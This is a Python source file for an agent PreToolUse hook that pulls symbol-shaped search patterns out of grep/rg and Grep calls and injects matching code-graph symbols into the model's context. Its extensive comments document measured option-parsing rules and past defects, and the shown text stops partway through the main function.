#!/usr/bin/env python3
"""PreToolUse hook — graph-augment the agent's own searches with Codex (techne#206).

When the agent issues a Grep tool call — or a Bash call whose command line
contains a symbol-shaped search, which is the common path (#596) — AND the opt-in
flag ``hooks.codex_grep_assist`` is ON, this hook runs a Codex symbol search for
the search pattern and injects the matching symbols into the model's context via
``hookSpecificOutput.additionalContext``.

Discipline (same fail-safe posture as post_tool_use / session_start):
  - NEVER blocks the tool. EVERY path exits 0.
  - stdout is ONLY ever the PreToolUse protocol JSON; when there's nothing to
    add, nothing is printed. ALL logging/errors go to stderr.
  - Any error (config load, missing codex.db, empty search) degrades to a no-op.

Protocol shape — OBSERVED, not inferred (#612, 2026-08-17):
  {"hookSpecificOutput": {"hookEventName": "PreToolUse",
                          "additionalContext": "..."}}

NOTE the absence of `permissionDecision`. This rail matches Bash, so a grant would
cover the entire command line rather than the segment it recognised — see the
comment at the emit site (#596 r7).

The word "confirmed" used to sit on this line while the shape was UNTESTED, and it
was borrowed: it traces to #208, whose payload INCLUDED the grant, so it never
evidenced the bare shape. `post_tool_use.py` ships the bare shape on PostToolUse,
where `permissionDecision` has no meaning — that evidences the field-set, not
PreToolUse's handling of its absence. So until #612 the claim rested on the docs.

It had to be settled by DOGFOOD, because telemetry structurally cannot see it:
`record_hook_run(outcome="ok")` fires on successful PRINTING, not delivery, so a
rail that emits into the void still reads healthy — which is techne#596's own
invisibility defect wearing a new hat.

THE OBSERVATION that closed #612: from a fresh session on runtime b377d75, a plain
`cd <repo> && grep -rn register_hooks <path>` — an ordinary Bash call, no Grep tool
— returned a "## Codex — symbols matching" block carrying four symbols. Delivery
confirmed. Two notes for whoever repeats this:
  - A silent run is not a dead rail. A multi-word pattern (`"def register_hooks"`)
    is rejected by `_SYMBOLISH` and records `noop:no-pattern`, printing nothing.
    `techne doctor` shows the last outcome; read it before concluding absence.
  - The repo resolved via `_bash_cd_target`, not the session cwd — which had no
    codex db and would have yielded `noop:no-repo-db`.
If the payload shape ever changes again, this note goes back to "inferred" until
someone re-runs that search.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import sys

# Tools whose pattern is a symbol-ish search worth augmenting with the code graph.
# Glob is excluded: its "pattern" is a file glob (e.g. **/*.py), not a symbol name,
# so feeding it to the symbol FTS yields noise/nothing (techne#206 dogfood).
#
# BASH IS HERE BECAUSE MATCHING ONLY `Grep` MADE THIS RAIL UNREACHABLE IN PRACTICE
# (techne#596). The rail was enabled, registered, and never fired once across a
# full session of searching this codebase — because every search was `grep` inside
# a `Bash` call, which is the natural reach when you are already running shell
# commands. That is not evasion: the guard's precondition was "the agent chose the
# Grep tool", and falsifying it was free, accidental and invisible. The same shape
# as the defects in #570/#581/#582, sitting in our own enforcement layer.
ASSIST_TOOLS = {"Grep", "Bash"}

#: Shell commands whose first non-flag argument is a search PATTERN. Deliberately
#: not the whole read-only set from post_tool_use — `find`/`ls`/`cat` take paths,
#: and feeding a path to the symbol FTS is the Glob mistake in a new costume.
#: `ag` IS DELIBERATELY ABSENT (#596 r4). It was listed, and its table entries were
#: wrong — `-f` (ag: --follow, no value) and `-D` (ag: --debug, no value) were both
#: filed as value-TAKING, so `ag -f <sym> src` injected `src`. The deeper problem is
#: that ag is not installed on this machine, so every claim about its flags would be
#: asserted from memory rather than measured against the binary — which is precisely
#: how the wrong entries got there. Declining `ag` outright costs a missed
#: augmentation and nothing else. Re-add it WITH A MEASURED TABLE, not from a man page.
_SEARCH_HEADS = frozenset({"grep", "egrep", "fgrep", "rg"})

#: PER-HEAD OPTION TABLES, MEASURED FROM THE BINARIES (#596 r4).
#:
#: Round 3 made unlisted options decline, which closed the unbounded failure class.
#: What it left was the *bounded* one: a letter in a shared table is an assertion
#: that it means the same thing in every tool, and those assertions were false.
#: Measured against the actual binaries here — `<tool> -X </dev/null`, where
#: "requires an argument" is the discriminator:
#:
#:   -r   grep: recursive, NO value   |  rg: --replace, TAKES a value
#:   -E   grep: --extended-regexp     |  rg: --encoding, TAKES a value
#:   -t   grep: not an option at all  |  rg: --type, TAKES a value
#:   -D   grep: --devices, TAKES one  |  rg: not an option at all
#:
#: So `rg -r new_name old_name .` injected `new_name`, and `grep -t <sym> src`
#: injected `src`. NO SINGLE SHARED TABLE CAN BE RIGHT — the same letter genuinely
#: has different arity per tool. The head is known at parse time, so scope by it.
#: Per-head tables need not be COMPLETE, because unlisted still declines; they only
#: need to be CORRECT for what they list. That is what makes this tractable where
#: round 3's "three hand-kept tables could never be complete" reasoning stalled.
_HEAD_ALIASES = {"grep": "grep", "egrep": "grep", "fgrep": "grep", "rg": "rg"}

#: (short_novalue, short_value, long_novalue, long_value) per canonical head.
#: `e` sits in short_value because -e DOES take a value — but that value is the
#: PATTERN, so `_named_pattern` intercepts it before arity is ever consulted.
_TABLES = {
    "grep": (
        # `grep` IN A BASH TOOL CALL IS NOT THE grep ON $PATH (#596 r5). Claude Code
        # installs a shell FUNCTION that shims grep to a ugrep bundled in the
        # `claude` binary — `shutil.which("grep")` reports /usr/bin/grep (BSD 2.6.0)
        # and never sees it. My r4 note claimed "BSD grep and ugrep agree exactly";
        # that was measured with a discriminator that false-negatives, because ugrep
        # given a value-taking option with nothing after it reports "no PATTERN
        # specified" rather than "requires an argument".
        #
        # Re-derived from the binary that actually runs, via `grep --help -X`, which
        # prints `-M MAGIC` for value-taking and `-y` for not: J, M and O ALL TAKE
        # VALUES and were all in this set, so `grep -M ELF <sym> src` injected `ELF`.
        # They are now in NEITHER table, which declines — deliberately, not by
        # omission: the shim falls back to THE REAL SYSTEM grep whenever an argument
        # matches `-[Zz]*`, `--null`, `-*-filter*` and friends, so which binary runs
        # depends on the REST of the command line. That fallback is BSD grep on THIS
        # machine and GNU grep on Linux (#611) — naming BSD alone read as a fact
        # about the shim when it is a fact about macOS, and GNU is the fallback that
        # matters wherever techne runs in CI or on a server. Strictly the ambiguity
        # is only reachable when a fallback trigger co-occurs (#596 r6 — "cannot be
        # resolved statically" overstated it); declining is still the right call,
        # because the rule stays true of the union and the cost is one niche form
        # (`grep -O py <sym> .`).
        #
        # ugrep also takes values for g, t, K and N; those are absent from both
        # tables and therefore already decline.
        #
        # P and G ARE MEASURED, NOT TRACED (#596 r6 corrected an earlier note here
        # that called them the weakest entries): ugrep documents `-G, --basic-regexp`
        # and `-P, --perl-regexp`, both no-value, and BSD grep takes `-G` no-value
        # too (`-P` is simply not a BSD option, so that path errors on its own).
        # Do not "fix" two correct entries on the strength of the old comment.
        frozenset("abchilnopqrsuvwxyzEFGHILRSUVXZPG"),
        frozenset("defmABCD"),
        # LONGS THAT MUST NOT SKIP A TOKEN. The r4 comment here reasoned from
        # GNU/BSD ("both are `--opt[=ARG]`, so bare they consume nothing"), and
        # that reasoning could not see the shim — which is why it missed
        # `--group-separator` for a whole round (#596 r6). Per-entry, measured
        # against ugrep's own help and behaviour:
        #
        #   --color / --colour     `--color[=WHEN]`  optional in BOTH -> consumes
        #                          nothing bare. Straightforwardly no-value.
        #   --group-separator      DECLINES — in NEITHER table (#611). It was here,
        #                          and "safe in both" is the test it fails. ugrep
        #                          spells it `--group-separator[=SEP]`, ATTACHED-ONLY,
        #                          so bare it consumes nothing (measured). GNU
        #                          documents `--group-separator=SEP` as REQUIRED, and
        #                          getopt_long accepts `--arg param` for a required
        #                          argument, so on GNU it EATS THE NEXT TOKEN. Listed
        #                          no-value, `grep --group-separator SEP <sym> src`
        #                          therefore injects `SEP` on Linux whenever the
        #                          separator is symbolish. BSD lacks the option
        #                          entirely. Contrast `--context` directly below,
        #                          which is ALSO tool-dependent and is KEPT: there,
        #                          no-value never injects a WRONG pattern in either
        #                          binary, only a missed one. That is the line —
        #                          not consistency for its own sake. Cost of
        #                          declining: the ugrep-correct BARE form is now a
        #                          missed augmentation. Only that form — an attached
        #                          `--group-separator=X` is self-contained in every
        #                          binary and `_consumes_next` returns False on the
        #                          `=` before any table is consulted, so it still
        #                          resolves. GNU grep is not installed here, so its
        #                          half is documented, not measured.
        #   --context              NOT optional in ugrep — it REQUIRES its argument
        #                          (`ugrep: invalid argument --context=my_symbol`),
        #                          the opposite of what r4 asserted. It stays here
        #                          because no-value is the only classification SAFE
        #                          IN BOTH: GNU/BSD really do treat it as optional, so
        #                          `long_value` would skip a real pattern there and
        #                          inject the path. The cost is that the LONG spelling
        #                          now DECLINES on grep — the numeric argument lands as
        #                          the first operand and is never `_SYMBOLISH`, so
        #                          `grep --context 3 <sym> src` yields None. A missed
        #                          augmentation, and the short `-C 3 <sym> src` form is
        #                          unaffected. (Measured. An earlier draft of this very
        #                          comment claimed the pattern "still resolves" — it
        #                          does not, and scoring the case is what caught it.)
        frozenset({"--color", "--colour", "--context"}),
        # HOW THIS BLOCK WAS DERIVED, recorded because its absence is what produced
        # the `--group-separator` defect (#611). Every OTHER table here carries its
        # provenance; this one carried none, and the r4 entries were generalised
        # from GNU/BSD rather than measured against the shim — reasoning that
        # structurally cannot find an option which is optional only in ugrep.
        #
        # These are options whose argument is REQUIRED IN EVERY CANDIDATE BINARY
        # (ugrep 7.5.0 here, GNU and BSD grep as the fallbacks), so skipping the
        # next token is right regardless of which one runs. That is the same
        # "safe in both" test `long_novalue` is held to, pointed the other way.
        #
        # `--max-count` carries one wrinkle worth recording so nobody rediscovers
        # it: UGREP REJECTS THE SEPARATE FORM outright — `grep --max-count 1 <sym>
        # src` exits 2 with "missing argument for --max-count", accepting only
        # `--max-count=1`. Harmless in effect (the command fails before we could
        # mislead anyone), and it stays listed because GNU accepts both spellings
        # and the entry has to be right for the binary that accepts the form.
        frozenset(
            {
                "--after-context",
                "--before-context",
                "--devices",
                "--directories",
                "--exclude",
                "--exclude-dir",
                "--exclude-from",
                "--file",
                "--include",
                "--label",
                "--max-count",
                "--binary-files",
            }
        ),
    ),
    "rg": (
        frozenset("abchilnopqsuvwxzFHILNPSUV"),
        frozenset("defgjmrtABCEMT"),
        # Full measured lists from `rg --help` (ripgrep 15.2.0). Note --context and
        # --color DO take values here, the opposite of grep — the divergence the
        # per-head split exists for.
        frozenset(
            {
                "--auto-hybrid-regex",
                "--binary",
                "--block-buffered",
                "--byte-offset",
                "--case-sensitive",
                "--column",
                "--count",
                "--count-matches",
                "--crlf",
                "--debug",
                "--files",
                "--files-with-matches",
                "--files-without-match",
                "--fixed-strings",
                "--follow",
                "--glob-case-insensitive",
                "--heading",
                "--help",
                "--ignore-case",
                "--ignore-file-case-insensitive",
                "--include-zero",
                "--invert-match",
                "--json",
                "--line-buffered",
                "--line-number",
                "--line-regexp",
                "--max-columns-preview",
                "--mmap",
                "--multiline",
                "--multiline-dotall",
                "--no-config",
                "--no-filename",
                "--no-ignore",
                "--no-ignore-dot",
                "--no-ignore-exclude",
                "--no-ignore-files",
                "--no-ignore-global",
                "--no-ignore-messages",
                "--no-ignore-parent",
                "--no-ignore-vcs",
                "--no-line-number",
                "--no-messages",
                "--no-pcre2-unicode",
                "--no-require-git",
                "--no-unicode",
                "--null-data",
                "--one-file-system",
                "--only-matching",
                "--passthru",
                "--pcre2",
                "--pcre2-version",
                "--pretty",
                "--quiet",
                "--search-zip",
                "--smart-case",
                "--sort-files",
                "--stats",
                "--stop-on-nonmatch",
                "--text",
                "--trace",
                "--trim",
                "--type-list",
                "--unrestricted",
                "--version",
                "--vimgrep",
                "--with-filename",
                "--word-regexp",
            }
        ),
        frozenset(
            {
                "--after-context",
                "--before-context",
                "--color",
                "--colors",
                "--context",
                "--context-separator",
                "--dfa-size-limit",
                "--encoding",
                "--engine",
                "--field-context-separator",
                "--field-match-separator",
                "--file",
                "--generate",
                "--glob",
                "--hostname-bin",
                "--hyperlink-format",
                "--iglob",
                "--ignore-file",
                "--max-columns",
                "--max-count",
                "--max-depth",
                "--max-filesize",
                "--path-separator",
                "--pre",
                "--pre-glob",
                "--regex-size-limit",
                "--replace",
                "--sort",
                "--sortr",
                "--threads",
                "--type",
                "--type-add",
                "--type-clear",
                "--type-not",
            }
        ),
    ),
}

#: A redirect target is NOT a path operand (#596 r3). `cat x | grep sym > out.txt`
#: fired, because `out.txt` counted as "this searches a tree" — it is where the
#: output GOES, and the command is still filtering stdin.
_REDIRECT = re.compile(r"^[0-9]*>>?|^<")

#: A pattern worth sending to the symbol index: a bare identifier, 3+ chars.
#: CONSERVATIVE ON PURPOSE — this rail's failure mode is noise, and noise is what
#: got the #206 original scoped down. Anything with a metacharacter, slash or dot
#: is a regex/path/glob, not a symbol name, so it is left alone. A missed
#: augmentation costs nothing; a wrong one trains the reader to ignore the block.
_SYMBOLISH = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{2,}$")


#: OPTIONS THAT MEAN "THERE IS NO INLINE PATTERN OPERAND" (#596 r5).
#:
#: `-e`/`--regexp` got special handling because their value IS the pattern. Their
#: siblings were missed, and they fail in the opposite direction: with `-f` the
#: patterns come from a FILE, so every remaining operand is a path, and `rg --files`
#: does not search at all — it lists files. The rail happily promoted the first
#: operand, so `rg --files src` injected `src` and `rg --files techne` injected
#: `techne`.
#:
#: BEING LISTED IS WHAT MADE THESE FIRE. An option absent from every table declines;
#: `-f` was in the value-taking table, so it was skipped cleanly and the path after
#: it looked exactly like a pattern. Correct arity is not enough — an option can
#: consume its value properly and still leave no pattern behind.
_NO_PATTERN_SHORT = frozenset("f")
_NO_PATTERN_LONG = frozenset(
    {
        "--file",
        "--files",
        "--type-list",
        "--pcre2-version",
        "--generate",
        "--version",
        "--help",
    }
)


def _declares_no_pattern(tok: str, head: str) -> bool:
    """True when *tok* means the command has no inline pattern operand."""
    if tok.startswith("--"):
        return tok.split("=", 1)[0] in _NO_PATTERN_LONG
    body = tok[1:]
    if not body:
        return False
    table = _TABLES.get(head)
    if table is None:
        return False
    short_novalue, short_value, _, _ = table
    for ch in body:
        if ch in _NO_PATTERN_SHORT:
            return True
        # Stop at the first value-taking letter: the remainder is ITS value, not
        # more flags, so an `f` inside it is data (`-A2f`, `-mf`).
        if ch in short_value or ch not in short_novalue:
            return False
    return False


def _named_pattern(tok: str, head: str) -> tuple[str, str | None] | None:
    """Does `tok` NAME the pattern via -e/--regexp? -> ("attached", v) | ("separate", None).

    THE ATTACHED SPELLINGS ARE THE POINT (#596 r4). `-e` and `--regexp` are the two
    options whose value IS the pattern, and both have attached forms that the
    arity walk got exactly backwards:

        grep --regexp=my_symbol src   ->  was injecting `src`
        grep -emy_symbol mydir        ->  was injecting `mydir`

    `--opt=value` returned False on the reasoning "the value is attached", and a
    cluster containing `e` returned False on "the caller handles it". Both are
    right for `--type=json` and `-ie <sym>`; both are wrong here, because the
    attached remainder is not a flag's value to skip — it is the thing we are
    looking for. The caller's special case only ever matched the SEPARATE
    spellings, so the pattern was skipped and the next operand promoted.
    """
    if tok.startswith("--"):
        if tok == "--regexp":
            return ("separate", None)
        if tok.startswith("--regexp="):
            return ("attached", tok.split("=", 1)[1])
        return None
    body = tok[1:]
    if not body:
        return None
    table = _TABLES.get(head)
    if table is None:
        return None  # head with no table — decline (a hook must never raise)
    short_novalue, short_value, _, _ = table
    for pos, ch in enumerate(body):
        if ch == "e":
            rest = body[pos + 1 :]
            return ("attached", rest) if rest else ("separate", None)
        # A value-taking letter BEFORE `e` swallows the remainder as ITS value, so
        # there is no `e` option here at all — let the arity walk handle the token.
        if ch in short_value or ch not in short_novalue:
            return None
    return None


def _consumes_next(tok: str, head: str) -> bool | None:
    """True/False if we KNOW whether `tok` consumes the next token; None if not.

    None means DECLINE THE WHOLE COMMAND. An option we do not recognise may or may
    not take a value, and guessing wrong promotes an operand to the pattern —
    which is how `rg --type json` came to search for `json`.

    `head` is the CANONICAL search head (`grep`/`rg`), because arity is a property
    of the tool and not of the letter: `-r` takes a value in rg and none in grep.
    """
    table = _TABLES.get(head)
    if table is None:
        return None  # head with no table — decline (a hook must never raise)
    short_novalue, short_value, long_novalue, long_value = table
    if tok.startswith("--"):
        if "=" in tok:
            return False  # value is attached
        if tok in long_value:
            return True
        if tok in long_novalue:
            return False
        return None  # unrecognised long option — too tool-specific to guess
    body = tok[1:]
    if not body:
        return None
    # Walk the cluster. A value-taking letter that is NOT last carries its value
    # ATTACHED (`-A5`, `-m2`), so the cluster consumes nothing further.
    for pos, ch in enumerate(body):
        if ch in short_value:
            return pos == len(body) - 1  # last -> separate value; else attached
        if ch not in short_novalue:
            return None  # unrecognised short flag — decline rather than guess
    return False


def _bash_search_pattern(command: str) -> str | None:
    """The symbol-shaped search pattern in a shell command, or None.

    Reuses the shared shell handling in ``core/shell_lex.py`` rather than
    re-deriving it: ``strip_heredoc_bodies`` (so a `grep` inside a heredoc BODY is
    not read as a command — techne#544's finding) and ``split_with_ops``
    (quote-aware, so a `grep "a|b"` alternation is not split mid-pattern). The
    evidence gate and the capture filter use the same module; a second copy would
    drift from them.

    A LATER PIPELINE SEGMENT WITH NO PATH OPERAND IS FILTERING OUTPUT, NOT
    SEARCHING A TREE, and declining those is what makes this rail usable at all.
    Measured in #596's round-1 review against a real 1237-symbol graph: 11 of 11
    everyday `<cmd> | grep <word>` calls injected context — `git branch -a | grep
    main` put 8 symbols and 1039 characters into the model's context, `env | grep
    PATH` another 8 — while the two genuine symbol searches injected 1 and 2. THE
    NOISE FIRED HARDER THAN THE SIGNAL. The discriminator below was scored, not
    guessed: 0 of 11 noise cases fire, 0 of 8 real searches are lost.
    """
    try:
        from techne.core import shell_lex

        with_ops = shell_lex.split_with_ops(shell_lex.strip_heredoc_bodies(command))
    except Exception:  # noqa: BLE001 — augmentation is best-effort, never fatal
        return None

    for seg, op in with_ops:
        piped_into = _is_piped_into(op)
        try:
            tokens = shlex.split(seg)
        except ValueError:  # unbalanced quotes — not parseable, skip
            continue
        head = os.path.basename(tokens[0])
        if head not in _SEARCH_HEADS:
            continue
        # THREE COLLECTIONS HAVE TO AGREE — `_SEARCH_HEADS`, `_HEAD_ALIASES` and
        # `_TABLES` — and nothing enforces it (#596 r5 Nit). A head added to the
        # first without the other two would KeyError INSIDE A HOOK. Decline instead:
        # this rail's contract is that it never breaks the tool call. Re-adding `ag`
        # is exactly the change that would trip this.
        canonical = _HEAD_ALIASES.get(head)
        if canonical is None:
            continue
        head = canonical

        pattern: str | None = None
        operands = 0
        rest = tokens[1:]
        i = 0
        while i < len(rest):
            tok = rest[i]
            if tok.startswith("-"):
                if _declares_no_pattern(tok, head):
                    return None  # patterns come from a file, or nothing is searched
                named = _named_pattern(tok, head)
                if named is not None:
                    kind, value = named
                    # MULTIPLE PATTERN-NAMING OPTIONS DECLINE (#596 r5 Nit). The
                    # tool searches for ALL of them; this rail can inject only one,
                    # and silently keeping the last is an arbitrary choice dressed
                    # as an answer.
                    if pattern is not None:
                        return None
                    if kind == "attached":
                        pattern = value  # `-e<sym>` / `--regexp=<sym>`
                        i += 1
                        continue
                    if i + 1 >= len(rest):
                        return None  # `-e` with nothing after it — malformed
                    pattern = rest[i + 1]  # named explicitly; the rest are paths
                    i += 2
                    continue
                consumes = _consumes_next(tok, head)
                if consumes is None:
                    return None  # unrecognised option — decline rather than guess
                i += 2 if (consumes and i + 1 < len(rest)) else 1
                continue
            redirect = _REDIRECT.match(tok)
            if redirect:
                # A redirect and ITS TARGET are both skipped. Attachment is decided
                # by whether anything FOLLOWS the operator (`>out.txt` attached,
                # `2>` not) — keying on token length gets `2>` wrong, since it is
                # two characters with a separate target.
                i += 1 if tok[redirect.end() :] else 2
                continue
            if pattern is None:
                pattern = tok
            else:
                operands += 1  # a file/dir argument — this searches a TREE
            i += 1

        if pattern is None or not _SYMBOLISH.match(pattern):
            return None
        if piped_into and operands == 0:
            return None  # filtering stdin, not searching a tree — see the docstring
        return pattern
    return None


def _is_piped_into(op: str | None) -> bool:
    """True if a segment receives the previous command's stdout: the operator
    before it is ``|`` or ``|&``.

    THE DISCRIMINATOR IS THE PIPE, NOT THE POSITION (#596 r2).
    The splitter splits on `&&`, `||`, `;`, newline and `|` alike, so "not the
    first segment" is not "later in a pipeline". Testing position declined
    `cd /repo && rg foo` — and `rg foo` with NO operand is rg's normal form, so
    that is a real search lost. Measured on the reviewer's corpus: pipe-precedence
    still declines 11/11 noise cases AND recovers every lost search.

    The operator comes from `shell_lex.split_with_ops`, the scanner that made the
    split. This used to re-locate each segment in the raw command by substring,
    which broke once segments stopped being substrings (comments and line
    continuations are dropped): PR 1353 review. An escaped `\\|` is not a pipe.
    """
    return op in ("|", "|&")


def _bash_cd_target(command: str) -> str | None:
    """The directory a leading literal ``cd`` moves to, or None.

    WITHOUT THIS THE HOOK INJECTS THE WRONG REPO'S SYMBOLS (#596 r1, measured):
    with the session cwd in repo alpha, `cd <beta> && grep -rn <alpha symbol> .`
    emitted ALPHA's symbols for a search run in BETA — the techne#206 signal/noise
    defect that techne#209's db-per-repo split exists to prevent, reintroduced
    because Bash carries no `path` field and `cd` was never parsed.

    LITERAL TARGETS ONLY. A path containing `$VAR`, a substitution, or `~` is left
    alone rather than expanded here: guessing a directory wrong scopes the graph to
    an unrelated repo, which is the failure being fixed, and the caller falls back
    to the session cwd — the pre-existing behaviour — when this returns None.
    """
    try:
        from techne.core.evidence import _strip_heredoc_bodies
        from techne.hooks.post_tool_use import _split_bash_segments

        segments = _split_bash_segments(_strip_heredoc_bodies(command))
    except Exception:  # noqa: BLE001
        return None
    if not segments:
        return None
    try:
        tokens = shlex.split(segments[0])
    except ValueError:
        return None
    if len(tokens) != 2 or tokens[0] != "cd":
        return None
    target = tokens[1]
    if any(ch in target for ch in ("$", "`", "~", "*")):
        return None
    return target


# Liveness key namespace: `hook:codex_grep_assist:last_run` (techne#468). Named
# for the RAIL rather than the hook file, because that is the thing an operator
# turns on in config and therefore the thing they expect a status for.
HOOK_NAME = "codex_grep_assist"


def _index_is_behind(idx: dict) -> bool:
    """True when a zero result cannot be trusted as genuine absence (techne#602).

    The silence-vs-noise dial for this rail. Anything that can HIDE a symbol
    counts: stale or missing indexed files, files on disk never indexed, files
    that could not be classified, a disk that could not be enumerated, and an
    empty index — which is the strongest claim of trust from the weakest
    evidence, and is reachable through the shipping CLI because codex_db_for_repo
    creates the db before initial_walk ever runs.

    Everything else stays silent. A complete, current index means the absence
    really is an absence, and saying so on every miss is how a warning becomes
    wallpaper.
    """
    return bool(
        idx.get("files", 0) == 0
        or idx.get("coverage") != "complete"
        or idx.get("unindexed")
        or idx.get("stale")
        or idx.get("missing")
        or idx.get("unknown")
    )


def _build_context(pattern: str, results: list[dict]) -> str:
    """Render matching symbols into a compact additionalContext block.

    Mirrors cli.py's `codex search` formatting. Freshness honesty (techne#89):
    any row whose freshness is NOT fresh/unknown carries a visible marker so the
    model knows the graph may be behind the working tree.
    """
    lines = [
        f"## Codex — symbols matching `{pattern}`",
        "> Experimental graph-assist (techne#206); the graph may be stale — verify before relying.",
        "",
    ]
    for s in results:
        freshness = s.get("freshness", "unknown")
        marker = f" [{freshness}]" if freshness not in ("fresh", "unknown") else ""
        lines.append(f"  {s['id']}  [{s['kind']}] {s['name']}  {s.get('signature') or ''}{marker}")
        lines.append(f"    {s['file']}")
    return "\n".join(lines)


def main() -> None:
    # ------------------------------------------------------------------
    # Parse stdin. Malformed → no-op.
    # ------------------------------------------------------------------
    try:
        data = json.load(sys.stdin)
    except json.JSONDecodeError:
        sys.exit(0)

    tool_name = data.get("tool_name", "")
    if tool_name not in ASSIST_TOOLS:
        sys.exit(0)

    # PREFILTER BEFORE ANY techne IMPORT (#596 r3). Matching Bash means this hook
    # now runs on nearly every tool call, and it measured ~113 ms added to each
    # one — of which the DECLINE path was 79%, i.e. almost all of it paid by calls
    # that were never searches. A pure-string test costs nothing and takes that to
    # ~49 ms. It is ALMOST, BUT NOT STRICTLY, weaker than `_bash_search_pattern`
    # (#596 r4 Nit — the r3 wording claimed "by construction" and that is not
    # proven): this is a SUBSTRING test on the raw command, while the parse takes
    # the BASENAME OF TOKEN 0 after shlex unquoting. So `g''rep -rn <sym> .` and
    # `gr\ep -rn <sym> .` would parse but are skipped here. Both are missed
    # augmentations, which cost nothing, and neither is a form an agent writes —
    # the gap is accepted knowingly rather than papered over.
    if tool_name == "Bash":
        _cmd = (data.get("tool_input") or {}).get("command") or ""
        if not any(h in _cmd for h in _SEARCH_HEADS):
            sys.exit(0)

    # ------------------------------------------------------------------
    # FAST PATH (techne#470). This rail is DEFAULT-OFF, so the overwhelmingly
    # common case is "decide there is no work and exit". Doing that via
    # `import techne.config` cost 100ms of a 145ms invocation, on a hook that
    # fires on every matching tool call.
    #
    # The stdlib-only cache answers the gate question in ~0ms of import, so the
    # disabled case now costs bare interpreter startup and nothing more. A miss
    # (absent / stale / malformed) falls through to the real Config below, which
    # regenerates the cache as a side effect — so this is an optimisation that
    # cannot be wrong, only occasionally slow.
    # ------------------------------------------------------------------
    try:
        from techne.fastconfig import get_bool, load_fast

        fast = load_fast()
        if fast is not None and not get_bool(fast, "hooks.codex_grep_assist"):
            sys.exit(0)
    except Exception:  # noqa: BLE001 — the fast path must never break the hook
        pass

    # ------------------------------------------------------------------
    # Config load can raise (corrupt/unreadable config). A PreToolUse hook that
    # throws would surface as a tool-call failure — degrade to a no-op instead.
    # ------------------------------------------------------------------
    try:
        from techne.config import Config

        config = Config.load()
    except Exception as e:  # noqa: BLE001
        print(f"techne: config load failed, skipping grep-assist: {e}", file=sys.stderr)
        sys.exit(0)

    # Flag gate: ON by default since #1020, experimental. Deliberately NOT recorded
    # as a liveness event — a disabled rail is DORMANT by configuration, not a
    # rail that ran and did nothing, and conflating the two is what makes
    # "enabled" indistinguishable from "working" (techne#468).
    if not config.hooks.codex_grep_assist:
        sys.exit(0)

    # From here on the rail is ON, so every exit path names itself. Before this
    # (techne#468) all five returned a silent exit 0 and wrote nothing anywhere,
    # which made this hook's liveness undecidable rather than merely unknown.
    from techne.hooks._liveness import record_hook_run

    # NB: deliberately NOT named `db_path` — that name is rebound below to the
    # per-repo CODEX db, and liveness belongs in the main techne db.
    techne_db = config.db_path

    tool_input = data.get("tool_input", {})
    if tool_name == "Bash":
        # A Bash call carries a whole command line, not a pattern field, and most
        # of them are not searches at all. Extract conservatively or decline —
        # declining is the common case and must stay cheap and silent.
        pattern = _bash_search_pattern(tool_input.get("command", "")) or ""
        if not pattern:
            # DELIBERATELY NOT RECORDED (#596 r2). Matching Bash means this hook
            # now fires on nearly every tool call, and recording each one
            # overwrote `hook:codex_grep_assist:last_run` — a single `git status`
            # clobbered a successful injection, so techne#468's detector read
            # identically whether the rail worked perfectly or never fired. That
            # is #596's own invisibility, relocated into the observability layer
            # by the fix for it.
            #
            # Same reasoning as the disabled-flag exit above: a rail that was not
            # APPLICABLE did not run and do nothing. Only outcomes of an actual
            # attempted search are liveness events.
            sys.exit(0)
    else:
        pattern = tool_input.get("pattern", "")
        if not pattern:
            record_hook_run(techne_db, HOOK_NAME, outcome="noop:no-pattern")
            sys.exit(0)

    # Resolve which repo the agent is actually working in: the Grep's target
    # `path` when given, else the session cwd. This scopes the injected symbols
    # to the repo being searched (techne#209 db-per-repo) — the fix for the
    # #206 signal/noise problem, where a single global graph injected an
    # unrelated repo's symbols.
    #
    # Bash has no `path` field. A leading literal `cd` is parsed because without
    # it the hook emitted the WRONG REPO'S symbols: with the session cwd in repo
    # alpha, `cd <beta> && grep -rn <alpha symbol> .` injected alpha's graph for a
    # search run in beta — techne#206's defect, reintroduced through the door
    # techne#209 was built to close (#596 r1, measured).
    #
    # Everything else still falls through to the session cwd, which is the
    # pre-existing behaviour for a Grep with no `path`. A search pointed at another
    # repo by a bare path operand is NOT followed: resolving that would mean
    # picking one of several operands and guessing, and guessing wrong is the very
    # failure above.
    session_cwd = data.get("cwd") or os.getcwd()
    cd_target = _bash_cd_target(tool_input.get("command", "")) if tool_name == "Bash" else None
    if cd_target and not os.path.isabs(cd_target):
        # RESOLVED AGAINST THE SESSION cwd, NOT THE HOOK PROCESS'S (#596 r2).
        # `find_repo_root` resolves a relative path against os.getcwd(), which is
        # wherever the hook happens to run — so `cd ../beta && grep …` injected a
        # THIRD repo's graph. This line deliberately mirrors the `data["cwd"]`
        # preference below rather than inheriting the process's.
        cd_target = os.path.normpath(os.path.join(session_cwd, cd_target))
    start_path = tool_input.get("path") or cd_target or session_cwd

    from techne.hooks._timeout import bounded_hook

    # ------------------------------------------------------------------
    # Resolve the per-repo codex db and run the query inside the wall-clock
    # budget. No indexed db for this repo → no-op. Any failure (search_symbols
    # raises; slow SQLite → HookTimeout) is swallowed and degrades to emitting
    # nothing.
    # ------------------------------------------------------------------
    try:
        from techne.core.codegraph import annotate_freshness, search_symbols
        from techne.core.codex import resolve_repo_db_for_query

        db_path = resolve_repo_db_for_query(config, start_path)
        if db_path is None:
            # The single most likely reason this rail looks "on but does
            # nothing": the repo being searched was never indexed.
            record_hook_run(techne_db, HOOK_NAME, outcome="noop:no-repo-db", detail=str(start_path))
            sys.exit(0)
        with bounded_hook(config.hooks.timeout_s, label="pre_tool_use"):
            results = annotate_freshness(
                db_path,
                search_symbols(db_path, pattern, limit=config.hooks.codex_grep_assist_limit),
            )
    except Exception as e:  # noqa: BLE001  — catches HookTimeout too
        print(f"techne: grep-assist degraded: {e}", file=sys.stderr)
        record_hook_run(
            techne_db,
            HOOK_NAME,
            outcome="noop:degraded",
            error={"stage": "search", "msg": f"{type(e).__name__}: {e}"},
        )
        sys.exit(0)

    if not results:
        # A STALE INDEX AND A GENUINELY ABSENT SYMBOL PRODUCED IDENTICAL SILENCE
        # (techne#602) — #595 in a third location, after codex_search was fixed in
        # #598. It matters MORE here than there: an MCP codex_search is a
        # deliberate query whose answer the caller reads, while this rail fires on
        # a search the agent was doing anyway, so its whole value is telling the
        # agent something it did not know to ask. Silence is indistinguishable
        # from the rail being off — which is how it spent months looking enabled
        # and doing nothing (#596).
        #
